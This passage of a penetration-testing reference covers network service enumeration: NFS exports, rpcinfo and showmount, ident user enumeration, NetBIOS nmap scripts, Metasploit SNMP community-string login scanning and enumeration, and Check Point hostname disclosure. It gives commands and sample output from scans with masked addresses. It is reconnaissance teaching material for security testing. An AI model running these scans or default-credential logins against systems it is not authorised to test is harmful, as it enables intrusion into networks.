<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">NFS</span> <span class="n">Export</span><span class="p">:</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">ftp</span><span class="o">/</span><span class="n">pub</span> <span class="p">[</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mf">255.255</span><span class="o">.</span><span class="mf">255.0</span><span class="p">]</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">96</span> <span class="n">of</span> <span class="mi">240</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">40</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">NFS</span> <span class="n">Export</span><span class="p">:</span> <span class="o">/</span><span class="n">common</span> <span class="p">[]</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id17">
<h3>Other<a class="headerlink" href="#id17" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rpcinfo">
<h4>rpcinfo<a class="headerlink" href="#rpcinfo" title="Permalink to this headline">¶</a></h4>
<p>rpcinfo makes an RPC call to an RPC server and reports what it finds</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rpcinfo</span> <span class="o">-</span><span class="n">p</span> <span class="n">IP_Address</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rpcinfo</span> <span class="o">-</span><span class="n">p</span> <span class="mf">10.7</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
 <span class="n">program</span> <span class="n">vers</span> <span class="n">proto</span>   <span class="n">port</span>  <span class="n">service</span>
  <span class="mi">100000</span>    <span class="mi">2</span>   <span class="n">tcp</span>    <span class="mi">111</span>  <span class="n">portmapper</span>
  <span class="mi">100000</span>    <span class="mi">2</span>   <span class="n">udp</span>    <span class="mi">111</span>  <span class="n">portmapper</span>
  <span class="mi">741824</span>    <span class="mi">1</span>   <span class="n">tcp</span>    <span class="mi">669</span>
  <span class="mi">741824</span>    <span class="mi">2</span>   <span class="n">tcp</span>    <span class="mi">669</span>
  <span class="mi">399929</span>    <span class="mi">2</span>   <span class="n">tcp</span>    <span class="mi">631</span>
</pre></div>
</div>
<p>The same can be achieved using showmount</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">showmount</span> <span class="o">-</span><span class="n">a</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">All</span> <span class="n">mount</span> <span class="n">points</span> <span class="n">on</span> <span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span>
<span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="o">/</span><span class="n">SSSC</span><span class="o">-</span><span class="n">LOGS</span>
<span class="mf">172.30</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="o">/</span><span class="n">sssclogs</span>
</pre></div>
</div>
<p>Multiple times we have seen msf nfsmount fail because of some error, so it sometimes better to just run a for loop with showmount</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>for i in $(cat /tmp/msf-db-rhosts-20160413-2660-62cf9a);
do
       showmount -a $i &gt;&gt; nfs_111;
done;
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="ident-port-113">
<h2>Ident - Port 113<a class="headerlink" href="#ident-port-113" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id18">
<h3>Nmap<a class="headerlink" href="#id18" title="Permalink to this headline">¶</a></h3>
<div class="section" id="auth-owners">
<h4>Auth-owners<a class="headerlink" href="#auth-owners" title="Permalink to this headline">¶</a></h4>
<blockquote>
<div><a class="reference external" href="https://nmap.org/nsedoc/scripts/auth-owners.html">auth-owners.nse</a></div></blockquote>
</div>
</div>
<div class="section" id="id19">
<h3>Other<a class="headerlink" href="#id19" title="Permalink to this headline">¶</a></h3>
<div class="section" id="ident-user-enum">
<h4>Ident-user-enum<a class="headerlink" href="#ident-user-enum" title="Permalink to this headline">¶</a></h4>
<p>If the port ident 113 is open, it might be a good idea to try pentest monkey ident-user-enum Perl Script. The same result is also achieved by</p>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">perl</span> <span class="n">ident</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">enum</span><span class="o">.</span><span class="n">pl</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="mi">22</span> <span class="mi">53</span> <span class="mi">111</span> <span class="mi">113</span> <span class="mi">512</span> <span class="mi">513</span> <span class="mi">514</span> <span class="mi">515</span>
<span class="n">ident</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">enum</span> <span class="n">v1</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pentestmonkey</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">ident</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">enum</span> <span class="p">)</span>

<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">22</span> <span class="p">[</span><span class="n">U2FsdGVkX19U</span><span class="o">+</span><span class="n">FaOs8zFI</span><span class="o">+</span><span class="n">sBFw5PBF2</span><span class="o">/</span><span class="n">hxWdfeblTXM</span><span class="o">=</span><span class="p">]</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">53</span> <span class="p">[</span><span class="n">U2FsdGVkX1</span><span class="o">+</span><span class="n">fVazmVwSBwobo05dskDNWG8mogAWzHS8</span><span class="o">=</span><span class="p">]</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">111</span>        <span class="p">[</span><span class="n">U2FsdGVkX1</span><span class="o">+</span><span class="n">GPhL0rdMggQOQmNzsxtKe</span><span class="o">+</span><span class="n">ro</span><span class="o">+</span><span class="n">YQ28nTg</span><span class="o">=</span><span class="p">]</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">113</span>        <span class="p">[</span><span class="n">U2FsdGVkX1</span><span class="o">+</span><span class="mi">5</span><span class="n">f5j9c2qnHFL5XKMcLV7YjUW8LYWN1ac</span><span class="o">=</span><span class="p">]</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">512</span>        <span class="p">[</span><span class="n">U2FsdGVkX1</span><span class="o">+</span><span class="n">IWVqsWohbUhjr3PAgbkWTaImWIODMUDY</span><span class="o">=</span><span class="p">]</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">513</span>        <span class="p">[</span><span class="n">U2FsdGVkX19EEjrVAxj0lX0tTT</span><span class="o">/</span><span class="n">FoB3J9BUlfVqN3Qs</span><span class="o">=</span><span class="p">]</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">514</span>        <span class="p">[</span><span class="n">U2FsdGVkX18</span><span class="o">/</span><span class="n">o1MMaGmcU4ul7kNowuhfBgiplQZ0R5c</span><span class="o">=</span><span class="p">]</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">515</span>        <span class="p">[</span><span class="n">U2FsdGVkX1</span><span class="o">/</span><span class="mi">8</span><span class="n">ef5wkL05TTMi</span><span class="o">+</span><span class="n">skSs65KRGIQB9Z8WnE</span><span class="o">=</span><span class="p">]</span>
</pre></div>
</div>
<p>The above are base64 encoded, when decoded results in Salted_Some_Garbage. If anyone know what it&#8217;s appreciated.</p>
</div>
</div>
</div>
<div class="section" id="netbios">
<h2>NetBios<a class="headerlink" href="#netbios" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id20">
<h3>Nmap<a class="headerlink" href="#id20" title="Permalink to this headline">¶</a></h3>
<div class="section" id="broadcast-netbios-master-browser">
<h4>broadcast-netbios-master-browser<a class="headerlink" href="#broadcast-netbios-master-browser" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/broadcast-netbios-master-browser.html">broadcast-netbios-master-browser.nse</a>  :</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">broadcast</span><span class="o">-</span><span class="n">netbios</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="n">browser</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">03</span> <span class="mi">21</span><span class="p">:</span><span class="mi">31</span> <span class="n">IST</span>
<span class="n">Pre</span><span class="o">-</span><span class="n">scan</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span> <span class="n">broadcast</span><span class="o">-</span><span class="n">netbios</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="n">browser</span><span class="p">:</span>
<span class="o">|</span> <span class="n">ip</span>             <span class="n">server</span>      <span class="n">domain</span>
<span class="o">|</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>  <span class="n">FILESRV</span>     <span class="n">WORKGROUP</span>
\<span class="o">|</span><span class="n">_192</span><span class="o">.</span><span class="mf">168.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>  <span class="n">XXXXCJ</span><span class="o">-</span><span class="n">NAS</span>  <span class="n">VOLUME</span>
<span class="n">WARNING</span><span class="p">:</span> <span class="n">No</span> <span class="n">targets</span> <span class="n">were</span> <span class="n">specified</span><span class="p">,</span> <span class="n">so</span> <span class="mi">0</span> <span class="n">hosts</span> <span class="n">scanned</span><span class="o">.</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="snmp-port-161">
<h2>SNMP - Port 161<a class="headerlink" href="#snmp-port-161" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id21">
<h3>Metasploit<a class="headerlink" href="#id21" title="Permalink to this headline">¶</a></h3>
<div class="section" id="snmp-community-scanner">
<h4>SNMP Community Scanner<a class="headerlink" href="#snmp-community-scanner" title="Permalink to this headline">¶</a></h4>
<p>Find the machines which are having default communtites by using SNMP Community Scanner.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">snmp</span><span class="o">/</span><span class="n">snmp_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">161</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.4</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">public</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">only</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">Cisco</span> <span class="n">IOS</span> <span class="n">Software</span><span class="p">,</span> <span class="n">C1130</span> <span class="n">Software</span> <span class="p">(</span><span class="n">C1130</span><span class="o">-</span><span class="n">K9W7</span><span class="o">-</span><span class="n">M</span><span class="p">),</span> <span class="n">Version</span> <span class="mf">12.4</span><span class="p">(</span><span class="mi">10</span><span class="n">b</span><span class="p">)</span><span class="n">JA</span><span class="p">,</span> <span class="n">RELEASE</span> <span class="n">SOFTWARE</span> <span class="p">(</span><span class="n">fc2</span><span class="p">)</span>
<span class="n">Technical</span> <span class="n">Support</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">cisco</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">techsupport</span>
<span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">1986</span><span class="o">-</span><span class="mi">2007</span> <span class="n">by</span> <span class="n">Cisco</span> <span class="n">Systems</span><span class="p">,</span> <span class="n">Inc</span><span class="o">.</span>
<span class="n">Compiled</span> <span class="n">Wed</span> <span class="mi">24</span><span class="o">-</span><span class="n">Oct</span><span class="o">-</span><span class="mi">07</span> <span class="mi">15</span><span class="p">:</span><span class="mi">17</span> <span class="n">by</span> <span class="n">prod_rel_team</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">12</span> <span class="n">of</span> <span class="mi">58</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">20</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">18</span> <span class="n">of</span> <span class="mi">58</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">31</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">public</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">only</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">Digi</span> <span class="n">Connect</span> <span class="n">ME</span> <span class="n">Version</span> <span class="mi">82000856</span><span class="n">_F6</span> <span class="mi">07</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2006</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">public</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">only</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">Digi</span> <span class="n">Connect</span> <span class="n">ME</span> <span class="n">Version</span> <span class="mi">82000856</span><span class="n">_F6</span> <span class="mi">07</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2006</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">24</span> <span class="n">of</span> <span class="mi">58</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">41</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">private</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">write</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">ExtremeXOS</span> <span class="n">version</span> <span class="mf">12.2</span><span class="o">.</span><span class="mf">2.11</span> <span class="n">v1222b11</span> <span class="n">by</span> <span class="n">release</span><span class="o">-</span><span class="n">manager</span> <span class="n">on</span> <span class="n">Mon</span> <span class="n">Mar</span> <span class="mi">23</span> <span class="mi">17</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">47</span> <span class="n">PDT</span> <span class="mi">2009</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">public</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">only</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">ExtremeXOS</span> <span class="n">version</span> <span class="mf">12.2</span><span class="o">.</span><span class="mf">2.11</span> <span class="n">v1222b11</span> <span class="n">by</span> <span class="n">release</span><span class="o">-</span><span class="n">manager</span> <span class="n">on</span> <span class="n">Mon</span> <span class="n">Mar</span> <span class="mi">23</span> <span class="mi">17</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">47</span> <span class="n">PDT</span> <span class="mi">2009</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">private</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">write</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">ExtremeXOS</span> <span class="n">version</span> <span class="mf">12.2</span><span class="o">.</span><span class="mf">2.11</span> <span class="n">v1222b11</span> <span class="n">by</span> <span class="n">release</span><span class="o">-</span><span class="n">manager</span> <span class="n">on</span> <span class="n">Mon</span> <span class="n">Mar</span> <span class="mi">23</span> <span class="mi">17</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">47</span> <span class="n">PDT</span> <span class="mi">2009</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">public</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">only</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">ExtremeXOS</span> <span class="n">version</span> <span class="mf">12.2</span><span class="o">.</span><span class="mf">2.11</span> <span class="n">v1222b11</span> <span class="n">by</span> <span class="n">release</span><span class="o">-</span><span class="n">manager</span> <span class="n">on</span> <span class="n">Mon</span> <span class="n">Mar</span> <span class="mi">23</span> <span class="mi">17</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">47</span> <span class="n">PDT</span> <span class="mi">2009</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">private</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">write</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">ExtremeXOS</span> <span class="n">version</span> <span class="mf">12.2</span><span class="o">.</span><span class="mf">2.11</span> <span class="n">v1222b11</span> <span class="n">by</span> <span class="n">release</span><span class="o">-</span><span class="n">manager</span> <span class="n">on</span> <span class="n">Mon</span> <span class="n">Mar</span> <span class="mi">23</span> <span class="mi">17</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">47</span> <span class="n">PDT</span> <span class="mi">2009</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">public</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">only</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">ExtremeXOS</span> <span class="n">version</span> <span class="mf">12.2</span><span class="o">.</span><span class="mf">2.11</span> <span class="n">v1222b11</span> <span class="n">by</span> <span class="n">release</span><span class="o">-</span><span class="n">manager</span> <span class="n">on</span> <span class="n">Mon</span> <span class="n">Mar</span> <span class="mi">23</span> <span class="mi">17</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">47</span> <span class="n">PDT</span> <span class="mi">2009</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">29</span> <span class="n">of</span> <span class="mi">58</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">50</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">35</span> <span class="n">of</span> <span class="mi">58</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">60</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">41</span> <span class="n">of</span> <span class="mi">58</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">70</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">47</span> <span class="n">of</span> <span class="mi">58</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">81</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.25</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">public</span> <span class="p">(</span><span class="n">Access</span> <span class="n">level</span><span class="p">:</span> <span class="n">read</span><span class="o">-</span><span class="n">only</span><span class="p">);</span> <span class="n">Proof</span> <span class="p">(</span><span class="n">sysDescr</span><span class="o">.</span><span class="mi">0</span><span class="p">):</span> <span class="n">Digi</span> <span class="n">Connect</span> <span class="n">ME</span> <span class="n">Version</span> <span class="mi">82000856</span><span class="n">_F6</span> <span class="mi">07</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2006</span>
</pre></div>
</div>
</div>
<div class="section" id="snmp-enumeration-module">
<h4>SNMP Enumeration Module<a class="headerlink" href="#snmp-enumeration-module" title="Permalink to this headline">¶</a></h4>
<p>Enumerate the devices for which we have found the community strings</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">snmp</span><span class="o">/</span><span class="n">snmp_enum</span>
<span class="n">creds</span> <span class="o">-</span><span class="n">p</span> <span class="mi">161</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">,</span> <span class="n">Connected</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">System</span> <span class="n">information</span><span class="p">:</span>

<span class="n">Host</span> <span class="n">IP</span>                       <span class="p">:</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="n">Hostname</span>                      <span class="p">:</span> <span class="n">X150</span><span class="o">-</span><span class="mi">24</span><span class="n">t</span>
<span class="n">Description</span>                   <span class="p">:</span> <span class="n">ExtremeXOS</span> <span class="n">version</span> <span class="mf">12.2</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">v1222b11</span> <span class="n">by</span> <span class="n">release</span><span class="o">-</span><span class="n">manager</span> <span class="n">on</span> <span class="n">Mon</span> <span class="n">Mar</span> <span class="mi">23</span> <span class="mi">17</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">47</span> <span class="n">PDT</span> <span class="mi">2009</span>
<span class="n">Contact</span>                       <span class="p">:</span> <span class="n">support</span><span class="nd">@extremenetworks</span><span class="o">.</span><span class="n">com</span><span class="p">,</span> <span class="o">+</span><span class="mi">1</span> <span class="mi">888</span> <span class="mi">257</span> <span class="mi">3000</span>
<span class="n">Location</span>                      <span class="p">:</span> <span class="o">-</span>
<span class="n">Uptime</span> <span class="n">snmp</span>                   <span class="p">:</span> <span class="o">-</span>
<span class="n">Uptime</span> <span class="n">system</span>                 <span class="p">:</span> <span class="mi">206</span> <span class="n">days</span><span class="p">,</span> <span class="mi">00</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mf">58.04</span>
<span class="n">System</span> <span class="n">date</span>                   <span class="p">:</span> <span class="o">-</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Network</span> <span class="n">information</span><span class="p">:</span>

<span class="n">IP</span> <span class="n">forwarding</span> <span class="n">enabled</span>         <span class="p">:</span> <span class="n">no</span>
<span class="n">Default</span> <span class="n">TTL</span>                   <span class="p">:</span> <span class="mi">64</span>
<span class="n">TCP</span> <span class="n">segments</span> <span class="n">received</span>         <span class="p">:</span> <span class="mi">6842</span>
<span class="n">TCP</span> <span class="n">segments</span> <span class="n">sent</span>             <span class="p">:</span> <span class="mi">6837</span>
<span class="n">TCP</span> <span class="n">segments</span> <span class="n">retrans</span>          <span class="p">:</span> <span class="mi">0</span>
<span class="n">Input</span> <span class="n">datagrams</span>               <span class="p">:</span> <span class="mi">243052379</span>
<span class="n">Delivered</span> <span class="n">datagrams</span>           <span class="p">:</span> <span class="mi">192775346</span>
<span class="n">Output</span> <span class="n">datagrams</span>              <span class="p">:</span> <span class="mi">993667</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="check-point-firewall-1-topology-port-264">
<h2>Check Point FireWall-1 Topology - Port 264<a class="headerlink" href="#check-point-firewall-1-topology-port-264" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id22">
<h3>Metasploit<a class="headerlink" href="#id22" title="Permalink to this headline">¶</a></h3>
<div class="section" id="checkpoint-firewall-1-securemote-topology-service-hostname-disclosure">
<h4>CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure<a class="headerlink" href="#checkpoint-firewall-1-securemote-topology-service-hostname-disclosure" title="Permalink to this headline">¶</a></h4>
<p>Module sends a query to the port 264/TCP on CheckPoint Firewall-1 firewalls to obtain the firewall name and management station (such as SmartCenter) name via a pre-authentication request</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">checkpoint_hostname</span>
<span class="nb">set</span> <span class="n">RHOST</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Attempting</span> <span class="n">to</span> <span class="n">contact</span> <span class="n">Checkpoint</span> <span class="n">FW1</span> <span class="n">SecuRemote</span> <span class="n">Topology</span> <span class="n">service</span><span class="o">...</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">a</span> <span class="n">CheckPoint</span> <span class="n">Firewall</span><span class="o">...</span>
